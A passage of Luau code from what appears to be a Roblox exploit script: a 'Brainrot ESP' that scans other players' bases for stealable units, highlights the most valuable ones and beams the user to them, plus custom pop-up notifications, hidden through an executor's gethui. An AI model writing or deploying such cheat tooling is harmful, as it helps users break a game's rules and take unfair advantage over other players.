			beam4.Name = "BrainrotBeamCore"
			beam4.Attachment0 = attachment
			beam4.Attachment1 = attachment4
			local v19 = beam4
			local colorSequence = ColorSequence.new
			local tbl20 = {}
			local v20 = ColorSequenceKeypoint.new(0, color2)
			local v21 = ColorSequenceKeypoint.new(0.5, color3)
			local new = ColorSequenceKeypoint.new
			tbl20[1] = v20
			tbl20[2] = v21

			do
				local values = table.pack(new(1, color4))
				table.move(values, 1, values.n, 3, tbl20)
			end

			v19.Color = colorSequence(tbl20)
			beam4.CurveSize0 = 1.8
			beam4.CurveSize1 = -1.8
			beam4.FaceCamera = true
			beam4.LightEmission = 0.6
			beam4.Segments = 20
			beam4.Transparency = NumberSequence.new(0.04)
			beam4.Width0 = 0.12
			beam4.Width1 = 0.22
			obj[beam4] = true
			beam4.Parent = attachment4
			v13 = parent
			v14 = parent2
		end

		fn26 = function(arg)
			fn41(arg)

			pcall(function()
				arg.Billboard:Destroy()
			end)

			pcall(function()
				arg.Highlight:Destroy()
			end)

			if v14 == arg.Root then
				fn24()
			end
		end
	end

	fn27 = function()
		for k, v19 in pairs(tbl6) do
			fn26(v19)
			tbl6[k] = nil
		end
	end

	n4 = 14

	do
		local v19 = nil
		local obj2 = setmetatable({}, { __mode = "k" })

		fn28 = function(arg)
			if v19 and v19.Parent then
				return arg == v19
			end
			local plotSign = arg and arg:FindFirstChild("PlotSign")
			if not plotSign then
				return false
			end
			local v20 = string.lower(localPlayer.Name)
			local v21 = string.lower(localPlayer.DisplayName)

			for _, descendant in ipairs(plotSign:GetDescendants()) do
				if descendant:IsA("TextLabel") then
					local v22 = string.lower(tostring(descendant.Text or ""))
					if v22 == "your base" or string.find(v22, v20, 1, true) or string.find(v22, v21, 1, true) then
						v19 = arg
						return true
					end
				end
			end

			return false
		end

		local function fn31(arg, arg2)
			local v20 = obj2[arg]
			if v20 and v20.Parent and tostring(v20.ActionText) == "Steal" then
				return v20
			end
			obj2[arg] = nil

			for _, descendant in ipairs(arg2:GetDescendants()) do
				if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == "Steal" then
					obj2[arg] = descendant
					return descendant
				end
			end

			return nil
		end

		fn29 = function(arg)
			local tbl17 = {}
			local animalPodiums = arg and arg:FindFirstChild("AnimalPodiums")
			if not animalPodiums then
				return tbl17
			end

			for _, child in ipairs(animalPodiums:GetChildren()) do
				local base = child:FindFirstChild("Base")
				base = base and base:FindFirstChild("Spawn")

				if base and base:IsA("BasePart") then
					local v20 = fn31(child, base:FindFirstChild("PromptAttachment") or base)

					if v20 then
						local str = tostring(v20.ObjectText or "")

						if str ~= "" then
							local tbl18 = tbl17[str]

							if not tbl18 then
								tbl18 = {}
								tbl17[str] = tbl18
							end

							tbl18[#tbl18 + 1] = base.Position
						end
					end
				end
			end

			return tbl17
		end
	end
end

do
	local function fn30(arg, arg2)
		if not (arg and arg2) then
			return false
		end

		for _, v15 in ipairs(arg2) do
			if (arg.Position - v15).Magnitude <= n4 then
				return true
			end
		end

		return false
	end

	local function fn31()
		local plots = Workspace:FindFirstChild("Plots")
		if not plots then
			fn27()
			return
		end
		local tbl9 = {}

		for _, child in ipairs(plots:GetChildren()) do
			if not fn28(child) then
				local v15 = fn29(child)

				for _, child2 in ipairs(child:GetChildren()) do
					if child2:IsA("Model") and tbl4[child2.Name] then
						local v16 = fn16(child2)

						if fn30(v16, v15[child2.Name]) then
							tbl9[child2] = true
							local v17 = tbl6[child2]

							if v17 and v17.Root ~= v16 then
								fn26(v17)
								v17 = nil
							end

							if not v17 then
								local v18 = fn17(child2, v16)
								tbl6[child2] = v18
								fn18(v18)
							end
						end
					end
				end
			end
		end

		for k, v15 in pairs(tbl6) do
			if not tbl9[k] or not k.Parent then
				fn26(v15)
				tbl6[k] = nil
			end
		end
	end

	local function fn32()
		if not flag2 then
			return
		end
		flag2 = false
		fn6(tbl5)
		fn24()
		fn27()
	end

	local function fn33()
		if flag2 then
			return
		end
		flag2 = true
		fn31()
		local n5 = 0

		tbl5[#tbl5 + 1] = RunService.RenderStepped:Connect(function()
			if not flag2 then
				return
			end
			local now = os.clock()

			if n5 <= now then
				n5 = now + 1
				fn31()
			end

			local generation = nil
			local v15 = nil

			for _, v16 in pairs(tbl6) do
				if v16.Root.Parent then
					local flag5 = flag4

					if not flag4 then
						flag5 = (v16.Generation or 0) >= n3
					end

					if flag5 and (not generation or v16.Generation > generation) then
						generation = v16.Generation
						v15 = v16
					end
				end
			end

			for _, v16 in pairs(tbl6) do
				local v17 = fn23(v16, v16 == v15)
				v16.Billboard.Enabled = v17
				v16.Highlight.Enabled = v17

				if v17 then
					v16.NameRow.Holder.Visible = tbl7.Name
					v16.ValueRow.Holder.Visible = tbl7.Value
					pcall(fn20, v16, now)
					pcall(fn19, v16, now)
					pcall(fn21, v16, now)
					pcall(fn22, v16, now)

					if tbl7.Rarity and v16.SourceRarityGrad and v16.SourceRarityGrad.Parent then
						pcall(function()
							v16.RarityRow.TextGradient.Offset = v16.SourceRarityGrad.Offset
							v16.RarityRow.TextGradient.Rotation = v16.SourceRarityGrad.Rotation
							v16.RarityRow.TextGradient.Color = v16.SourceRarityGrad.Color
						end)
					end

					if tbl7.Mutation and v16.SourceMutationGrad and v16.SourceMutationGrad.Parent then
						pcall(function()
							v16.MutationRow.TextGradient.Offset = v16.SourceMutationGrad.Offset
							v16.MutationRow.TextGradient.Rotation = v16.SourceMutationGrad.Rotation
							v16.MutationRow.TextGradient.Color = v16.SourceMutationGrad.Color
						end)
					end
				end
			end

			local v16 = fn7()
			local v17 = flag3
			local v18

			if flag3 then
				v18 = v15
			else
				v18 = v17
			end

			if not (v18 and v16) then
				if attachment then
					fn24()
				end
			else
				local flag5 = v13 ~= v16 or v14 ~= v15.Root

				if not flag5 then
					flag5 = not (attachment and attachment.Parent)
				end

				if flag5 then
					fn25(v16, v15.Root, v15.BeamTint)
				end
			end
		end)
	end

	v12.Event:Connect(fn32)
	chilliBrainrotESPRuntime.Destroying:Connect(fn32)

	local v15 = v9:CreateToggle({
		Name = "Brainrot ESP",
		Default = true,
		Callback = function(arg)
			if arg then
				fn33()
			else
				fn32()
			end
		end,
	})

	v9:CreateSlider({
		Name = "Brainrot ESP Size",
		Min = 50,
		Max = 200,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = v15,
		Callback = function(arg)
			n2 = math.clamp((tonumber(arg) or 100) / 100, 0.5, 2)

			for _, v16 in pairs(tbl6) do
				fn18(v16)
			end
		end,
	})

	v9:CreateMultiDropdown({
		Name = "Show Information",
		Note = "Choose what each Brainrot tag shows.",
		Options = { "Name", "Mutation", "Value", "Trails", "Rarity" },
		Default = { "Name", "Value", "Trails" },
		Quick = false,
		SubOf = v15,
		Callback = function(arg)
			local tbl9 = { Name = false, Mutation = false, Value = false, Trails = false, Rarity = false }

			if type(arg) == "table" then
				for k, v16 in pairs(arg) do
					if type(v16) == "string" then
						if tbl9[v16] ~= nil then
							tbl9[v16] = true
						elseif v16 == "Type" then
							tbl9.Rarity = true
						end
					elseif type(k) == "string" and v16 == true then
						if tbl9[k] ~= nil then
							tbl9[k] = true
						elseif k == "Type" then
							tbl9.Rarity = true
						end
					end
				end
			end

			tbl7 = tbl9
		end,
	})

	local v16 = nil
	local n5 = 1
	local str = "M/s"

	local function fn34(arg, arg2)
		if arg ~= nil then
			n5 = math.floor(tonumber(arg) or n5)
		end

		if arg2 ~= nil then
			str = tostring(arg2)
		elseif v16 and v16.GetUnit then
			local unit = v16:GetUnit()

			if unit and unit ~= "" then
				str = tostring(unit)
			end
		end

		n3 = n5 * (tbl8[str] or tbl8["M/s"]).Mult
	end

	local function fn35(arg)
		str = arg
		local ms = tbl8[arg] or tbl8["M/s"]

		if v16 and v16.SetRange then
			v16:SetRange(ms.Min, ms.Max)
			local min = v16:Get() or ms.Min
			local min2 = ms.Min
			local max = ms.Max
			local n6 = math.clamp(math.floor(min + 0.5), min2, max)

			if n6 ~= min then
				v16:Set(n6)
			else
				fn34(n6, arg)
			end
		else
			fn34(nil, arg)
		end
	end

	v16 = v9:CreateSlider({
		Name = "Brainrot ESP Min Value",
		Note = "Filters out Brainrots below this threshold. Tap arrow to change unit (K/s, M/s, B/s).",
		Min = 0,
		Max = 1000,
		Default = 1,
		AllowDecimals = false,
		Increment = 1,
		Unit = {
			Default = "M/s",
			Selector = true,
			Options = { "K/s", "M/s", "B/s" },
			ColorEnabled = true,
			Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
			Callback = function(arg)
				fn35(arg)
			end,
		},
		Quick = false,
		SubOf = v15,
		Callback = function(arg)
			fn34(arg, nil)
		end,
	})

	v9:CreateToggle({
		Name = "Best Brainrot Only",
		Default = true,
		Quick = false,
		SubOf = v15,
		Callback = function(arg)
			flag4 = arg == true
		end,
	})

	v9:CreateToggle({
		Name = "Beam To Best",
		Note = "Draws one beam from you to the highest generation Brainrot.",
		Default = true,
		Quick = false,
		SubOf = v15,
		Callback = function(arg)
			flag3 = arg == true
		end,
	})
end

local str
str = "__ChilliBrainrotNotificationRuntime"
local n5
n5 = 0.75
local n6
n6 = 3
local chilliBrainrotNotificationRuntim, v15
chilliBrainrotNotificationRuntim, v15 = fn5("__ChilliBrainrotNotificationRuntime")
local flag5
flag5 = false
local str2
str2 = ""
local soundId
soundId = ""
local str3
str3 = ""
local n7
n7 = 1000000
local flag6
flag6 = true
local n8
n8 = 0
local n9
n9 = 0
local connection
connection = nil
local obj2
obj2 = setmetatable({}, { __mode = "k" })
local v16
v16 = nil
local tbl9, v17, v18, TweenService, font, tbl10, tbl11, tbl12
local v19 = nil
tbl9 = {}
v17 = nil
v18 = nil
TweenService = game:GetService("TweenService")
font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
tbl10 = {}
tbl11 = {}
tbl12 = {}

pcall(function()
	local Animals = require(ReplicatedStorage.Datas.Animals)

	if type(Animals) == "table" then
		tbl10 = Animals
	end
end)

pcall(function()
	local Mutations = require(ReplicatedStorage.Datas.Mutations)

	if type(Mutations) == "table" then
		tbl11 = Mutations
	end
end)

pcall(function()
	local Traits = require(ReplicatedStorage.Datas.Traits)

	if type(Traits) == "table" then
		tbl12 = Traits
	end
end)

pcall(function()
	local Gradients = require(ReplicatedStorage.Packages.Gradients)

	if type(Gradients) == "table" then
		v19 = Gradients
	end
end)

local tbl13
tbl13 = {}

do
	local tbl14 = { Preset = "Zebra", Background = Color3.fromRGB(16, 16, 20) }
	local colorSequence = ColorSequence.new
	local tbl15 = {}
	local v20 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
	local v21 = ColorSequenceKeypoint.new(0.24, Color3.fromRGB(45, 45, 55))
	local v22 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
	local v23 = ColorSequenceKeypoint.new(0.76, Color3.fromRGB(45, 45, 55))
	tbl15[1] = v20
	tbl15[2] = v21
	tbl15[3] = v22
	tbl15[4] = v23

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
		table.move(values, 1, values.n, 5, tbl15)
	end

	tbl14.Colors = colorSequence(tbl15)
	tbl13["Secret Zebra"] = tbl14
end

local fn30, fn31

do
	local function fn32()
		if v16 then
			return v16
		end
		local controllers = ReplicatedStorage:FindFirstChild("Controllers")
		controllers = controllers and controllers:FindFirstChild("NotificationController")
		if not (controllers and controllers:IsA("ModuleScript")) then
			return nil
		end
		local ok, result = pcall(require, controllers)

		if ok and type(result) == "table" then
			v16 = result
		end

		return v16
	end

	local function fn33(arg)
		local match = tostring(arg or ""):match("(%d+)")
		if match and tonumber(match) and tonumber(match) > 0 then
			return "rbxassetid://" .. match
		end
		return nil
	end

	local function fn34(arg)
		if not arg then
			return nil
		end

		if arg:IsA("Sound") then
			return fn33(arg.SoundId)
		end

		if arg:IsA("StringValue") then
			local v20 = fn33(arg.Value)
			if v20 then
				return v20
			end
		end

		local v20 = fn33(arg:GetAttribute("SoundId"))
		if v20 then
			return v20
		end
		local sound = arg:FindFirstChildWhichIsA("Sound", true)
		return sound and fn33(sound.SoundId) or nil
	end

	local function fn35()
		local v20 = ipairs
		local tbl14 = {}
		local v21 = table.pack(game:GetService("SoundService"))
		tbl14[1] = ReplicatedStorage

		do
			local values = table.pack(table.unpack(v21, 1, v21.n))
			table.move(values, 1, values.n, 2, tbl14)
		end

		for _, v22 in v20(tbl14) do
			local crystalSpawn = v22:FindFirstChild("CrystalSpawn", true)
			local v23 = fn34(crystalSpawn)
			if v23 then
				return v23
			end
		end

		return ""
	end

	fn30 = function(arg)
		str2 = tostring(arg or "")
	end

	fn31 = function()
		local v20 = fn33(str2)

		if not v20 then
			soundId = str3
			v.Notify("Sound ID Failed", "Invalid asset ID. Restored the default Crystal sound.", 5)
			return false
		end

		local sound = Instance.new("Sound")
		sound.Name = "ChilliSoundIdValidation"
		sound.SoundId = v20
		sound.Volume = 0
		sound.Parent = game:GetService("SoundService")
		local flag7 = false

		local isLoaded = pcall(function()
			game:GetService("ContentProvider"):PreloadAsync({ sound }, function(arg, arg2)
				if arg2 == Enum.AssetFetchStatus.Success then
					flag7 = true
				end
			end)
		end) and (flag7 or sound.IsLoaded or sound.TimeLength > 0)

		sound:Destroy()

		if not isLoaded then
			soundId = str3
			v.Notify("Sound ID Failed", "Audio unavailable. Restored the default Crystal sound.", 5)
			return false
		end

		soundId = v20
		str2 = v20
		v.Notify("Sound ID Applied", v20 .. " is now used for Brainrot notifications.", 5)
		return true
	end

	local function fn36()
		if soundId == "" then
			return
		end
		local sound = Instance.new("Sound")
		sound.Name = "ChilliBrainrotNotificationSound"
		sound.SoundId = soundId
		sound.Volume = 1
		sound.Parent = game:GetService("SoundService")

		if not pcall(function()
			sound:Play()
		end) then
			sound:Destroy()
			return
		end

		game:GetService("Debris"):AddItem(sound, 15)
	end

	str3 = fn35()
	soundId = str3
	str2 = soundId

	local function fn37(parent, arg)
		local uiGradient = Instance.new("UIGradient")
		uiGradient.Color = arg.Colors
		uiGradient.Rotation = 8
		uiGradient.Parent = parent
		local tween = TweenService:Create(uiGradient, TweenInfo.new(1.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), { Rotation = 368 })
		tween:Play()

		return function()
			tween:Cancel()
		end
	end

	local function fn38(arg, parent, name, text, position, size, textSize)
		local clone = arg:Clone()
		clone.Name = name
		clone.Visible = true
		clone.RichText = true
		clone.BackgroundTransparency = 1
		clone.AutomaticSize = Enum.AutomaticSize.None
		clone.AnchorPoint = Vector2.zero
		clone.Position = position
		clone.Size = size
		clone.Text = text
		clone.TextScaled = false
		clone.TextSize = textSize
		clone.TextXAlignment = Enum.TextXAlignment.Left
		clone.TextYAlignment = Enum.TextYAlignment.Center
		clone.FontFace = font
		clone.Parent = parent
		return clone
	end

	local function fn39(parent, arg, arg2)
		if not (arg2 and arg2.Parent) then
			return false
		end

		local ok, result = pcall(function()
			return arg2:Clone()
		end)

		if not ok or not result then
			return false
		end

		for _, descendant in ipairs(result:GetDescendants()) do
			if descendant:IsA("ParticleEmitter") or descendant:IsA("Beam") or descendant:IsA("Trail") or descendant:IsA("Light") or descendant:IsA("Sound") or descendant:IsA("Script") or descendant:IsA("LocalScript") then
				descendant:Destroy()
			end
		end

		local worldModel = Instance.new("WorldModel")
		worldModel.Parent = parent
		result.Parent = worldModel

		pcall(function()
			result:PivotTo(CFrame.new())
		end)

		local cframe = CFrame.new()

		local ok2, result2, result3 = pcall(function()
			return result:GetBoundingBox()
		end)

		ok2 = ok2 and result2 and result3
		local vector = Vector3.new(4, 4, 4)

		if not ok2 then
			result3 = vector
			result2 = cframe
		end

		local position = result2.Position
		local n10 = math.max(math.max(result3.X, result3.Y, result3.Z) * 1.35, 3.5)
		arg.FieldOfView = 40
		arg.CFrame = CFrame.lookAt(position + Vector3.new(n10 * 0.28, n10 * 0.08, -n10), position, Vector3.new(0, 1, 0))
		local humanoid = arg2:FindFirstChildWhichIsA("Humanoid") or arg2:FindFirstChildWhichIsA("AnimationController")
		humanoid = humanoid and humanoid:FindFirstChildOfClass("Animator")
		local humanoid2 = result:FindFirstChildWhichIsA("Humanoid") or result:FindFirstChildWhichIsA("AnimationController")
		local animator = humanoid2 and humanoid2:FindFirstChildOfClass("Animator")

		if humanoid and animator then
			local playingAnimationTracks = humanoid:GetPlayingAnimationTracks()
			playingAnimationTracks = playingAnimationTracks and playingAnimationTracks[1]

			if playingAnimationTracks and playingAnimationTracks.Animation then
				local animation = Instance.new("Animation")
				animation.AnimationId = playingAnimationTracks.Animation.AnimationId

				local ok3, result4 = pcall(function()
					return animator:LoadAnimation(animation)
				end)

				if ok3 and result4 then
					pcall(function()
						result4.Looped = true
						result4:Play(0)
						result4.TimePosition = playingAnimationTracks.TimePosition
						result4:AdjustSpeed(playingAnimationTracks.Speed)
					end)
				end
			end
		end

		return true
	end

	local function fn40(arg)
		local v20 = table.find(tbl9, arg)

		if v20 then
			table.remove(tbl9, v20)
		end
	end

	local function createFrame()
		if v18 and v18.Parent then
			return v18
		end
		local parent = CoreGui

		if type(gethui) == "function" then
			local ok
			ok, parent = pcall(gethui)
			ok = ok and typeof(parent) == "Instance"
			local v20 = CoreGui

			if not ok then
				parent = v20
			end
		end

		local name = str .. "Gui"
		local v20 = parent:FindFirstChild(name)

		if v20 then
			pcall(function()
				v20:Destroy()
			end)
		end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.DisplayOrder = 190
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.Parent = parent
		local frame = Instance.new("Frame")
		frame.Name = "NotificationStack"
		frame.AnchorPoint = Vector2.new(0.5, 0)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Position = UDim2.fromScale(0.5, 0.025)
		frame.Size = UDim2.new(1, -16, 0.55, 0)
		frame.Parent = screenGui
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Vertical
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		uiListLayout.Padding = UDim.new(0, 5)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
		uiListLayout.Parent = frame
		v17 = screenGui
		v18 = frame
		return frame
	end

	local function fn41()
		local currentCamera = Workspace.CurrentCamera
		local x = currentCamera and currentCamera.ViewportSize.X or 1280

		if x <= 0 then
			x = 1280
		end

		return math.clamp((x - 24) / 620, 0.44, 0.72)
	end

	local function fn42(arg, arg2, arg3)
		local secretZebra = tbl13[arg3 or "Secret Zebra"] or tbl13["Secret Zebra"]
		if type(arg) ~= "table" or not arg.Model then
			return false
		end
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		local notification = playerGui and playerGui:FindFirstChild("Notification")
		notification = notification and notification:FindFirstChild("Notification")
		notification = notification and notification:FindFirstChild("Template")

		if not (notification and notification:IsA("TextLabel")) then
			local v20 = fn32()

			if v20 and type(v20.Notify) == "function" then
				local str4 = string.upper(tostring(arg.Name or "Brainrot")) .. " APPEARED!  " .. tostring(arg.ValueText or "")
				local v21 = pcall
				local notify = v20.Notify
				arg2 = arg2 or 6
				local top = v21(notify, v20, str4, arg2, nil, "Top")

				if top then
					fn36()
				end

				return top
			end

			return false
		end

		local v20 = createFrame()
		if not v20 then
			return false
		end

		while #tbl9 >= 4 do
			local v21 = table.remove(tbl9, 1)

			if v21 and v21.Parent then
				v21:Destroy()
			end
		end

		local frame = Instance.new("Frame")
		frame.Name = "ChilliSpecialNotificationSlot"
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		local v21 = fn41()
		frame.Size = UDim2.new(1, 0, 0, math.ceil(108 * v21 + 7))
		frame.ZIndex = 179
		frame.Parent = v20
		tbl9[#tbl9 + 1] = frame
		local frame2 = Instance.new("Frame")
		frame2.Name = "ScaledCardRoot"
		frame2.AnchorPoint = Vector2.new(0.5, 0)
		frame2.BackgroundTransparency = 1
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.fromScale(0.5, 0)
		local ceil = math.ceil
		frame2.Size = UDim2.fromOffset(math.ceil(620 * v21), ceil(108 * v21))
		frame2.ZIndex = 179
		frame2.Parent = frame
		local uiScale = Instance.new("UIScale")
		uiScale.Scale = v21 * 0.72
		uiScale.Parent = frame2
		local frame3 = Instance.new("Frame")
		frame3.Name = "ChilliSpecialNotification"
		frame3.BackgroundColor3 = secretZebra.Background
		frame3.BackgroundTransparency = 0.04
		frame3.BorderSizePixel = 0
		frame3.ClipsDescendants = false
		frame3.AnchorPoint = Vector2.new(0.5, 0)
		frame3.Position = UDim2.fromOffset(310, 0)
		frame3.Size = UDim2.fromOffset(620, 108)
		frame3.ZIndex = 180
		frame3.Parent = frame2
		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = UDim.new(0, 17)
		uiCorner.Parent = frame3
		local uiGradient = Instance.new("UIGradient")
		local colorSequence = ColorSequence.new
		local tbl14 = {}
		local v22 = ColorSequenceKeypoint.new(0, secretZebra.Background)
		local v23 = ColorSequenceKeypoint.new(0.48, secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.12))
		local new = ColorSequenceKeypoint.new
		local background = secretZebra.Background
		tbl14[1] = v22
		tbl14[2] = v23

		do
			local values = table.pack(new(1, background))
			table.move(values, 1, values.n, 3, tbl14)
		end

		uiGradient.Color = colorSequence(tbl14)
		uiGradient.Rotation = 12
		uiGradient.Parent = frame3
		local uiStroke = Instance.new("UIStroke")
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke.Color = Color3.new(1, 1, 1)
		uiStroke.Thickness = 2.5
		uiStroke.Transparency = 0.05
		uiStroke.Parent = frame3
		local uiGradient2 = Instance.new("UIGradient")
		uiGradient2.Color = secretZebra.Colors
		uiGradient2.Parent = uiStroke
		local tween = TweenService:Create(uiGradient2, TweenInfo.new(2.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), { Rotation = 360 })
		tween:Play()
		local uiStroke2 = Instance.new("UIStroke")
		uiStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke2.Color = secretZebra.Colors.Keypoints[1].Value
		uiStroke2.Thickness = 7
		uiStroke2.Transparency = 0.72
		uiStroke2.Parent = frame3
		local viewportFrame = Instance.new("ViewportFrame")
		viewportFrame.Name = "BrainrotPreview"
		viewportFrame.Ambient = Color3.fromRGB(190, 190, 200)
		viewportFrame.BackgroundColor3 = secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.08)
		viewportFrame.BackgroundTransparency = 0.08
		viewportFrame.BorderSizePixel = 0
		viewportFrame.ClipsDescendants = true
		viewportFrame.LightColor = Color3.fromRGB(255, 255, 255)
		viewportFrame.LightDirection = Vector3.new(-0.4, -0.7, -0.6)
		viewportFrame.Position = UDim2.fromOffset(11, 9)
		viewportFrame.Size = UDim2.fromOffset(90, 90)
		viewportFrame.ZIndex = 183
		viewportFrame.Parent = frame3
		local uiCorner2 = Instance.new("UICorner")
		uiCorner2.CornerRadius = UDim.new(0, 14)
		uiCorner2.Parent = viewportFrame
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Color = Color3.new(1, 1, 1)
		uiStroke3.Thickness = 2
		uiStroke3.Transparency = 0.18
		uiStroke3.Parent = viewportFrame
		local uiGradient3 = Instance.new("UIGradient")
		uiGradient3.Color = secretZebra.Colors
		uiGradient3.Rotation = -25
		uiGradient3.Parent = uiStroke3
		local camera = Instance.new("Camera")
		camera.Parent = viewportFrame
		viewportFrame.CurrentCamera = camera
		fn39(viewportFrame, camera, arg.Model)
		local brainrotName = fn38(notification, frame3, "BrainrotName", tostring(arg.Name or "Brainrot"), UDim2.fromOffset(115, 7), UDim2.new(1, -252, 0, 34), 22)
		brainrotName.RichText = false
		brainrotName.TextColor3 = Color3.new(1, 1, 1)
		brainrotName.TextTruncate = Enum.TextTruncate.AtEnd
		brainrotName.Font = Enum.Font.GothamBlack
		brainrotName.ZIndex = 183
		local tbl15 = {}

		local function fn43(parent, thickness)
			local uiStroke4 = Instance.new("UIStroke")
			uiStroke4.Name = "SpecialTextOutline"
			uiStroke4.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke4.Color = Color3.fromRGB(0, 0, 0)
			uiStroke4.Thickness = thickness or 1.15
			uiStroke4.Transparency = 0.18
			uiStroke4.Parent = parent
			local v24 = fn37(parent, secretZebra)

			if v24 then
				tbl15[#tbl15 + 1] = v24
			end
		end

		fn43(brainrotName, 1.35)
		local frame4 = Instance.new("Frame")
		frame4.Name = "AppearedBadge"
		frame4.AnchorPoint = Vector2.new(1, 0)
		frame4.BackgroundColor3 = secretZebra.Colors.Keypoints[1].Value
		frame4.BackgroundTransparency = 0.08
		frame4.BorderSizePixel = 0
		frame4.Position = UDim2.new(1, -13, 0, 10)
		frame4.Size = UDim2.fromOffset(112, 25)
		frame4.ZIndex = 183
		frame4.Parent = frame3
		local uiCorner3 = Instance.new("UICorner")
		uiCorner3.CornerRadius = UDim.new(1, 0)
		uiCorner3.Parent = frame4
		local uiGradient4 = Instance.new("UIGradient")
		uiGradient4.Color = secretZebra.Colors
		uiGradient4.Rotation = 12
		uiGradient4.Parent = frame4
		local uiStroke4 = Instance.new("UIStroke")
		uiStroke4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke4.Color = Color3.new(1, 1, 1)
		uiStroke4.Thickness = 1.25
		uiStroke4.Transparency = 0.2
		uiStroke4.Parent = frame4
		local appearedText = fn38(notification, frame4, "AppearedText", "APPEARED!", UDim2.fromOffset(6, 0), UDim2.new(1, -12, 1, 0), 12)
		appearedText.RichText = false
		appearedText.Font = Enum.Font.Arcade
		appearedText.TextColor3 = Color3.new(1, 1, 1)
		appearedText.TextXAlignment = Enum.TextXAlignment.Center
		appearedText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
		appearedText.TextStrokeTransparency = 0.25
		appearedText.ZIndex = 184
		local frame5 = Instance.new("Frame")
		frame5.Name = "GenerationBadge"
		frame5.BackgroundColor3 = Color3.fromRGB(4, 24, 10)
		frame5.BackgroundTransparency = 0.18
		frame5.BorderSizePixel = 0
		frame5.Position = UDim2.fromOffset(115, 44)
		frame5.Size = UDim2.fromOffset(142, 26)
		frame5.ZIndex = 183
		frame5.Parent = frame3
		local uiCorner4 = Instance.new("UICorner")
		uiCorner4.CornerRadius = UDim.new(0, 8)
		uiCorner4.Parent = frame5
		local uiStroke5 = Instance.new("UIStroke")
		uiStroke5.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke5.Color = Color3.fromRGB(75, 255, 104)
		uiStroke5.Thickness = 1.2
		uiStroke5.Transparency = 0.35
		uiStroke5.Parent = frame5
		local brainrotValue = fn38(notification, frame5, "BrainrotValue", tostring(arg.ValueText or ""), UDim2.fromOffset(9, 0), UDim2.new(1, -18, 1, 0), 18)
		brainrotValue.RichText = false
		brainrotValue.Font = Enum.Font.RobotoMono
		brainrotValue.TextColor3 = Color3.fromRGB(86, 255, 105)
		brainrotValue.TextStrokeColor3 = Color3.fromRGB(0, 32, 7)
		brainrotValue.TextStrokeTransparency = 0.15
		brainrotValue.ZIndex = 184
		local uiGradient5 = Instance.new("UIGradient")
		local colorSequence2 = ColorSequence.new
		local tbl16 = {}
		local v24 = ColorSequenceKeypoint.new(0, Color3.fromRGB(42, 220, 76))
		local v25 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(208, 255, 132))
		local new2 = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl16[1] = v24
		tbl16[2] = v25

		do
			local values = table.pack(new2(1, color(38, 255, 105)))
			table.move(values, 1, values.n, 3, tbl16)
		end

		uiGradient5.Color = colorSequence2(tbl16)
		uiGradient5.Rotation = -8
		uiGradient5.Parent = brainrotValue
		local tween2 = TweenService:Create(uiGradient5, TweenInfo.new(1.45, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), { Rotation = 18 })
		tween2:Play()

		tbl15[#tbl15 + 1] = function()
			tween2:Cancel()
		end

		if arg.MutationVisible then
			local brainrotMutation = fn38(notification, frame3, "BrainrotMutation", tostring(arg.MutationText or ""), UDim2.fromOffset(115, 76), UDim2.new(1, -304, 0, 22), 17)
			brainrotMutation.RichText = arg.MutationRichText == true
			brainrotMutation.TextColor3 = arg.MutationColor or Color3.fromRGB(235, 235, 240)
			brainrotMutation.TextStrokeColor3 = arg.MutationStrokeColor or Color3.fromRGB(0, 0, 0)
			brainrotMutation.TextStrokeTransparency = arg.MutationStrokeTransparency or 0.25
			brainrotMutation.TextTruncate = Enum.TextTruncate.AtEnd
			brainrotMutation.ZIndex = 183

			if arg.MutationFontFace then
				brainrotMutation.FontFace = arg.MutationFontFace
			end

			if arg.MutationGradientColor then
				local uiGradient6 = Instance.new("UIGradient")
				uiGradient6.Color = arg.MutationGradientColor
				uiGradient6.Rotation = arg.MutationGradientRotation or 0
				uiGradient6.Transparency = arg.MutationGradientTransparency or NumberSequence.new(0)
				uiGradient6.Parent = brainrotMutation
			else
				local uiStroke6 = Instance.new("UIStroke")
				uiStroke6.Name = "MutationGlow"
				uiStroke6.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
				uiStroke6.Color = arg.MutationColor or Color3.new(1, 1, 1)
				uiStroke6.Thickness = 1.1
				uiStroke6.Transparency = 0.5
				uiStroke6.Parent = brainrotMutation
			end
		end

		local frame6 = Instance.new("Frame")
